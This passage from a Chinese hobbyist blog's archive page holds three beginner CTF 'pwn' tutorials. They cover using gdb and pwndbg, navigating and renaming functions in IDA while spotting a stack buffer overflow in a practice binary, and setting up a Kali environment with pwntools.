<p>然后就会提示这个….好吧，我们再输入r，运行程序，r是run的缩写</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t4.png" alt=""></p>
<p>之后按下ctrl+c</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t5.png" alt=""></p>
<p>就会出现这个界面，不用担心，这个是正常的，gdb接收到信号，让程序停在那里而已，这个时候再输入vmmap</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t6.png" alt=""></p>
<p>我们来解释下怎么看显示的东西</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t7.png" alt=""></p>
<p>这里显示说明了哪个颜色是哪个段的，为了让没学过操作系统的也明白，我简单解释下各个名词</p>
<ul>
<li>STACK：栈，用来保存函数运行时的临时变量等</li>
<li>HEAP：堆，一般是主动编写代码来分配和回收堆内存</li>
<li>CODE: 代码段，是用来存放代码的</li>
<li>DATA：数据段，一般用来存放全局变量</li>
</ul>
<p>除此之外还有白色的，一般是用来存放各种不可修改的数据的，如这里的0x600000  -  0x601000，是用来存放程序的静态变量，大部分是各种字符串</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t8.png" alt=""></p>
<p>这里是各个段的开始和结束位置</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t9.png" alt=""></p>
<p>这里是各个段的权限</p>
<ul>
<li>r 可读</li>
<li>w 可写</li>
<li>x 可执行</li>
</ul>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t10.png" alt=""></p>
<p>这里是各个段的来源或者标识，例如前三个段就来自babystack，[stack] 就说明这是栈</p>
<h4 id="下面来介绍下gdb的基本操作"><a href="#下面来介绍下gdb的基本操作" class="headerlink" title="下面来介绍下gdb的基本操作"></a>下面来介绍下gdb的基本操作</h4><ul>
<li>r = run 运行程序，如果你当前已经在运行程序了，再输入r会重新运行程序</li>
<li>b =  break    下断点，在调试pwn中，一般是 b<em> 0xabcde ，abcde是在ida中看到的地址,如b</em> 0x400908</li>
<li>c =  continue   继续运行程序直到停在下一个断点</li>
<li>n =  next  下一行，一般装了pwndbg之后下一行指的是下一条汇编，但是如果调试的程序是带调试信息的，一般会跳几行汇编</li>
<li>ni = nexti  下一条指令，这个就是真正的下一条汇编指令</li>
<li>s = step 继续运行程序直到跳到不同的函数，一般是调用call之后会停在call那个函数的开始位置</li>
<li>d = delete 删除断点，后面可带数字，说明删除第几个断点，如果不带参数，说明删除全部断点</li>
<li>x  查看内存</li>
</ul>
<p>这些指令的具体用法都可以用help来查看，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help x</span><br></pre></td></tr></table></figure></p>
<p>而且一般c,n,ni这几个程序都可以带一个数字，用来代表连续运行这个指令多少次，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ni 10</span><br></pre></td></tr></table></figure>
<p>就代表下10行指令</p>
<h4 id="其中x的用法要熟练掌握！"><a href="#其中x的用法要熟练掌握！" class="headerlink" title="其中x的用法要熟练掌握！"></a>其中x的用法要熟练掌握！</h4><p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t11.png" alt=""></p>
<p>我们用help来查看x的用法，基本的格式是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/格式  地址</span><br></pre></td></tr></table></figure>
<p>如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10xw 0x601020</span><br></pre></td></tr></table></figure></p>
<p>这里就代表以16进制的格式显示0x601020开始的10个字，这里的字是4个字节</p>
<p>运行的结果</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t12.png" alt=""></p>
<p>还有一个例子就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s/10s 0x400ABD</span><br></pre></td></tr></table></figure>
<p>这里是显示从0x400ABD开始的10条字符串</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t13.png" alt=""></p>
<p>这里还要介绍一个就是，在调试32位和64位的程序的时候，要用不同的大小，在64位程序上一般用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/40xg 0x601020</span><br></pre></td></tr></table></figure>
<p>而在32位程序上一般是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/40xw 0x601020</span><br></pre></td></tr></table></figure>
<p>这个是因为64位程序的一个地址一般用两个字来表示，而32位只用一个字</p>
<h4 id="我们来练习下下断点"><a href="#我们来练习下下断点" class="headerlink" title="我们来练习下下断点"></a>我们来练习下下断点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b* 0x4009D8</span><br><span class="line">r</span><br></pre></td></tr></table></figure>
<p>输入以上的命令，在出现的菜单输入1</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t14.png" alt=""></p>
<p>就会断在这个地方</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t15.png" alt=""></p>
<p>就是我们下断点的地方</p>
<p>我们再下一个断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b* 0x400A1A</span><br></pre></td></tr></table></figure>
<p>然后输入c，继续运行</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t16.png" alt=""></p>
<p>这个时候是不是什么都没显示？</p>
<p>这是因为我们上一个断点停在了call read这里，程序还在等待我们的输入</p>
<p>我们随便输入1234，按下回车</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t17.png" alt=""></p>
<p>这个时候就断在了这个地方了</p>
<h4 id="接下来我们介绍下如何调试开了pie的程序"><a href="#接下来我们介绍下如何调试开了pie的程序" class="headerlink" title="接下来我们介绍下如何调试开了pie的程序"></a>接下来我们介绍下如何调试开了pie的程序</h4><p>我们先下载一个程序</p>
<p><a href="https://github.com/charlieleex/charlieleex.github.io/blob/master/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/babyheap" target="_blank" rel="noopener">babyheap</a></p>
<p>将其复制到虚拟机中，chmod 777 babyheap加权限，gdb ./babyheap调试</p>
<p>先输入r，运行程序，然后按ctrl+c，输入vmmap，查看程序的基址</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t18.png" alt=""></p>
<p>这里我的基址是0x555555554000，每个人的可能有些不同</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t19.png" alt=""></p>
<p>在ida中看到的地址不像没开pie的，这里只有很短的4位，所以假如说我要在1063这个地址下个断点，在gdb中是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b* 0x1063+0x555555554000</span><br></pre></td></tr></table></figure>
<p>后面的基址如果是gdb attach来调试的话，每次都会改变，但是像这样用gdb来调试的话，不会每次都改变</p>
<p>我们来练习一下，假如要下个断点在0xB9C</p>
<p>是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b* 0xB9C+0x555555554000</span><br></pre></td></tr></table></figure></p>
<p>然后再输入c，然后再随便输入个数字</p>
<p>可以看到程序断在了</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t20.png" alt=""></p>
<p>这里就是gdb的基本操作，如果想了解gdb的更多骚操作，可以去百度或者谷歌搜下gdb的教程或者基本用法</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://charlieleex.github.io/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/" data-id="cjkuhp5ch0003q0u5q958p3ke" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pwn从入门到放弃第二章——ida的基本使用教程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/" class="article-date">
  <time datetime="2018-06-21T11:56:35.000Z" itemprop="datePublished">2018-06-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/">pwn从入门到放弃第二章——ida的基本使用教程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="其实ida与gdb的使用是一个不断学习的过程，不是一蹴而就的，所以这里只是介绍一下基本的使用方法"><a href="#其实ida与gdb的使用是一个不断学习的过程，不是一蹴而就的，所以这里只是介绍一下基本的使用方法" class="headerlink" title="其实ida与gdb的使用是一个不断学习的过程，不是一蹴而就的，所以这里只是介绍一下基本的使用方法"></a>其实ida与gdb的使用是一个不断学习的过程，不是一蹴而就的，所以这里只是介绍一下基本的使用方法</h4><h4 id="这里还要说一下，善用gdb和ida，能在比赛的时候加快审计和调试代程序的速度，就能更快解题拿到一血（虽然现在一血没什么用了………"><a href="#这里还要说一下，善用gdb和ida，能在比赛的时候加快审计和调试代程序的速度，就能更快解题拿到一血（虽然现在一血没什么用了………" class="headerlink" title="这里还要说一下，善用gdb和ida，能在比赛的时候加快审计和调试代程序的速度，就能更快解题拿到一血（虽然现在一血没什么用了……….."></a>这里还要说一下，善用gdb和ida，能在比赛的时候加快审计和调试代程序的速度，就能更快解题拿到一血（虽然现在一血没什么用了………..</h4><h2 id="ida的使用"><a href="#ida的使用" class="headerlink" title="ida的使用"></a>ida的使用</h2><p>首先给下ida 7.0的下载地址，推荐使用7.0， 因为6.8或者更低的版本反编译成c语言代码不是很好</p>
<p><a href="https://www.52pojie.cn/thread-675251-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-675251-1-1.html</a></p>
<p>貌似只有百度云了，凑合着下吧…….</p>
<p>这里给一个比赛的二进制文件，用来作为教程的例子，记得要用64位的ida来打开</p>
<p><a href="https://github.com/charlieleex/charlieleex.github.io/tree/master/2018/06/21/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%BA%8C%E7%AB%A0%E2%80%94%E2%80%94ida%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/babystack" target="_blank" rel="noopener">babystack</a></p>
<p>下面是ida加载完文件之后的界面，有时候会加载到start那里，所以我们双击一下左边的main</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t1.png" alt=""></p>
<p>这个时候按下空格，会发现界面切换了</p>
<p>一开始的界面是汇编层面上的流程图，空格切换之后就是顺序的汇编代码</p>
<p>这个时候再按下Tab键或者f5，就可以看到反编译后的c语言代码，我比较常用的是tab，因为可以从c语言返回到汇编界面</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t2.png" alt=""></p>
<p>这里是反汇编后的c语言代码</p>
<p>这里会看到很多sub_4008b9 这种函数，这是ida对于没有调试信息的二进制的函数的处理</p>
<p>单纯看着这些函数经常会看错，而且不清楚那个函数到底干了什么</p>
<p>所以我们就要对这些函数进行重命名</p>
<p>我们首先双击sub_4008b9，进入这个函数看看里面究竟干了什么</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t3.png" alt=""></p>
<p>里面还有sub_400826</p>
<p>再点进去</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t4.png" alt=""></p>
<p>发现其实就只是调用了puts</p>
<p>这个时候点击如图所示的红框圈着的返回</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t5.png" alt=""></p>
<p>返回到上一层</p>
<p>单击一下sub_400826, 然后就会像下图一样变黄（感觉有点不对劲…..</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t6.png" alt=""></p>
<p>然后按一下n</p>
<p>会弹出一个框</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t7.png" alt=""></p>
<p>这里输入mputs，然后回车，可以看到那些函数都变成mputs了</p>
<p>下面那个函数看了下，调用了strlen，然后再调用了write，就叫它mwrite吧，改好之后就变成</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t8.png" alt=""></p>
<p>所以这个函数的功能就是输出菜单</p>
<p>返回上一层，把这个函数改成menu吧</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t9.png" alt=""></p>
<p>当把所有函数的名字都改好了之后，整个程序的逻辑就很清晰了</p>
<p>一般做一道pwn题，这个步骤是最先做的，做完这一步，后面就是代码审计，找出程序的漏洞</p>
<p>我们继续讲下ida的使用</p>
<p>主函数的sub_40841其实是一个读取数字的函数，我们可以将其改名为get_num</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t10.png" alt=""></p>
<p>我们可以看上图中红色框框的地方，那些rsp+10h就是指明了那些变量在栈上的位置，rsp，rbp这两个是寄存器，可以简单的理解为指向栈底和栈顶的寄存器（并不完全正确，但是初步理解一下</p>
<p>这里我们看到，s和v6之间的空间是  0x98-0x10=0x88 这么大，这其实就说明s实际上是一个0x88字节大小的char数组</p>
<p>下面我们看到switch中的case 1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0,&amp;s,0x100);</span><br></pre></td></tr></table></figure>
<p>s只有0x88字节大小，但是却往里面读进去0x100字节大小的数据，这里就会导致缓冲区溢出</p>
<p>简单的从ida静态分析，我们就可以看出程序的漏洞在哪里</p>
<h4 id="下面，我们来了解一下交叉引用和搜索"><a href="#下面，我们来了解一下交叉引用和搜索" class="headerlink" title="下面，我们来了解一下交叉引用和搜索"></a>下面，我们来了解一下交叉引用和搜索</h4><p>按下Tab，让右边的界面变成顺序的汇编代码，双击下左边的puts，下图红框框着的地方</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t11.png" alt=""></p>
<p>然后右边就会显示</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t12.png" alt=""></p>
<p>红框框着的地方就是交叉引用了</p>
<p>这里就显示了puts这个库函数被什么调用了</p>
<p>我们可以双击 main+E1</p>
<p>然后我们就看到</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t13.png" alt=""></p>
<p>跳到main函数调用puts的地方了，再按下Tab</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t14.png" alt=""></p>
<p>我们看到原来是case2 中调用了puts</p>
<p>那这个交叉引用在分析程序中有什么用呢？下面简单说下</p>
<p>假如要分析的程序非常大，有很多函数，很难一个个分析过来，这个时候看到它调用了库函数system</p>
<p>我们就可以靠交叉引用来找出哪一部分调用了system，再进行重点的分析</p>
<p>但是，有时候交叉引用显示的数量太少，我们有两个办法</p>
<ol>
<li>选择上面的Options-&gt;General-&gt;Cross-references</li>
</ol>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t15.png" alt=""></p>
<p>改红框里面的数字就能更改显示的reference数量</p>
<ol start="2">
<li>直接进行搜索</li>
</ol>
<p>按下快捷键Alt+T，会弹出如下图的搜索框</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t16.png" alt=""></p>
<p>如果要不选红框那里的话，会搜索光标以下的代码，如果选了红框，会搜索整个二进制</p>
<p><img src="/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/t17.png" alt=""></p>
<p>不过这里搜索的结果有点多，要自己肉眼过滤一波</p>
<p>这里只是简单介绍了一下ida的使用，更详细的可以上网搜索《IDA.Pro权威指南》这本书，里面有各种ida的使用技巧</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://charlieleex.github.io/2018/06/21/pwn从入门到放弃第二章——ida的基本使用教程/" data-id="cjkuhp5cg0002q0u53i8o65ix" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pwn从入门到放弃第一章——环境安装" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/21/pwn从入门到放弃第一章——环境安装/" class="article-date">
  <time datetime="2018-06-21T09:27:33.000Z" itemprop="datePublished">2018-06-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/21/pwn从入门到放弃第一章——环境安装/">pwn从入门到放弃第一章——环境安装</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>做pwn 比较重要的就是一个好的环境，这里介绍一下入门的环境安装</p>
<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>下载kali vmware镜像，如果自身装了双系统kali的可以跳过此步骤，但是可能因为kali的版本不对而导致一些东西安装失败或者运行出错</p>
<p>这里是下载地址</p>
<p><a href="https://images.offensive-security.com/virtual-images/kali-linux-2017.1-vm-amd64.7z" target="_blank" rel="noopener">https://images.offensive-security.com/virtual-images/kali-linux-2017.1-vm-amd64.7z</a></p>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>下载完之后，解压镜像到一个文件夹</p>
<p>然后导入到vmware里面</p>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>运行kali</p>
<p>默认帐号密码是<br>root<br>toor</p>
<p>接着打开terminal</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<p>接着输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure></p>
<p>然后进入编辑界面，按一下i，输入或者粘贴下面的内容 (在kali下面粘帖是按ctrl+shift+v)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.163.com/debian/ stretch main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ stretch main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib</span><br></pre></td></tr></table></figure></p>
<p>输入完之后，按下esc，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></table></figure></p>
<p>如下图</p>
<p><img src="/2018/06/21/pwn从入门到放弃第一章——环境安装/t1.png" alt=""></p>
<p>然后按下回车，就会退出</p>
<p>这里解释下为什么要干这一步，看不懂可以暂时跳过<br>kali的官方源会把libc更新到2.27，但是我们平时做题一般都是用Libc 2.24，如果更新到2.27 就不能正常的做某些题目，所以这里是把源换成163的debian源</p>
<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><p>在terminal里面继续输入命令, 安装 pwntools</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><p>安装pwndbg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<h3 id="到这里，一个做pwn的环境已经搭建好了"><a href="#到这里，一个做pwn的环境已经搭建好了" class="headerlink" title="到这里，一个做pwn的环境已经搭建好了"></a>到这里，一个做pwn的环境已经搭建好了</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://charlieleex.github.io/2018/06/21/pwn从入门到放弃第一章——环境安装/" data-id="cjkuhp55x0001q0u52llqq517" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/08/15/large-bin-attack-学习记录/">large bin attack 学习记录</a>
          </li>
        
          <li>
            <a href="/2018/07/29/pwn从入门到放弃第六章——简单ROP/">pwn从入门到放弃第六章——简单ROP</a>
          </li>
        
          <li>
            <a href="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/">pwn从入门到放弃第五章——最简简简简简简单的栈溢出</a>
          </li>
        
          <li>
            <a href="/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/">pwn从入门到放弃第四章——pwntools的基本使用教程</a>
          </li>
        
          <li>
            <a href="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/">pwn从入门到放弃第三章——gdb的基本使用教程</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 Charlie<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.aspnetcdn.com/ajax/jQuery/jquery-2.1.1.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>